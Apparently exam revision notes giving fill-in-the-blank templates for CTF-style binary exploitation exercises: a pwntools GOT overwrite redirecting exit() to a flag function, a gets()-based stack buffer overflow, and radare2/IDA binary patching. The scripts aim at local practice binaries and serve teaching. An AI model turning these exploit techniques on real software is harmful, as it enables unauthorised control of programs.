# Templates of solutions of exam exercises

## Write-where-what (GOT exploit)

### Write up
If we execute the program, we discover that the binary provides a simple write-what-where (basically it writes wherever we say so, something we put as input) so it would be a good idea to overwrite some entry in the GOT in order to get control of the program control flow.

A good candidate for the overwrite would be (as usual) the "exit()" function, which absolute address can be found in the terminal using "objdump --dynamic-reloc ./____ and it's: ___________.

We can use radare2, and in particular the command afl to check if there is a function we would like to call to get the flag (which most likely it's never called), in this case it is: ______________. We can in this way also retrieve its address which is ___________-

We can then use pwntools to send these inputs (see script.py).

We simply execute the python script to retrieve the flag which is: ___________________________

### Python script
This could be the script.py mentioned before:
```python
from pwn import *

p = process("./______")

exit_addr = (str(int(0x_______))).encode("ascii")         # ascii-encoded address of the exit() function
useful_function_addr = (str(int(0x_______))).encode("ascii")       # ascii-encoded address of the __________ function

p.sendline(exit_addr)       # send the address of where to writewhere
p.sendline(useful_function_addr)      # send the address of what to writewhere

print(p.recvall())
```
or equivalently, if we want to retrieve all the addresses directly from python:
```python
from pwn import *

context.binary = "./______"
e: ELF = context.binary
p = process()

exit_addr = str(e.got["exit"]).encode("ascii")       # ascii-encoded address of the exit() function
useful_function_addr = str(e.functions["____________"].address).encode("ascii")    # ascii-encoded address of the __________ function

p.sendline(exit_addr)       # send the address of where to writewhere
p.sendline(useful_function_addr)      # send the address of what to writewhere

print(p.recvall())
```


## Buffer overflow (getc/s functions exploit)
### Write-up
We use ida to inspect the binary. We immediately notice that in the function ______________  for handling the user input the "gets()" _______or "getc()"_______  function is used (which we know it doesn't check the input length). 
Moreover, also the content of the buffer isn't checked against anything so we can just fill it with 'A's. In particular, since the target buffer is _________ bytes long, we will have a padding of at least _____ bytes long. (___________watch rdi in cyclic pattern_____________)

Basically, we have a buffer overflow vulnerability, so after overflowing the buffer with the padding we just need to overwrite some stack variables with the correct values. 
The only important thing here is overwriting the variables with the correct value and in the correct order (that's easily checked by looking at the variables positiion in the stack).
Using Ida we can see there are a series of test/jump instructions in the binary so we can just try to change the variables according to the strings the stack variables are compared to.
In particular, these strings are in order = _______, __________ etc....

We can send our input using pwntools (see script.py). 

We execute the python file and retrieve the flag which is: ______________________

### Python script
```python
from pwn import *

p = process("./_________")

padding = b'A' * _______  
p.sendline(padding + b'________' + b'_________' etc)

print(p.recvall())

```


## Patching 
### Write up

### Patching procedure
Firstly, copy the executable with: cp ./_________  ___________patched.
Then open the ___________patched with Ida.

> ***PLEASE NOTE:*** Remember %rdi, %rsi, %rdx, %rcx, %r8, and %r9 to store function parameters and %rax to store the return address. Base pointer (%ebp, %rbp) to store the current stack address.
Also, remember that the destination is always before the source in the 2-operator instructions.

If not explicitely written in the text of the exercise, if there is a print_flag function we can overwrite the exit instruction with 
a simple jmp print_flag_address using radare 2, by:
```python
r2 -w ./name_prog     # open the file in write mode
afl     # to retrieve the address of the function print_flag
s 0x___       # to move to the addr of the exit function 
wa jmp 0x___      # to patch the binary
```
Inside the print_flag there might be some controls done using test/jump instruction, we can simply use ida to patch this instruction and reverse the jumps.




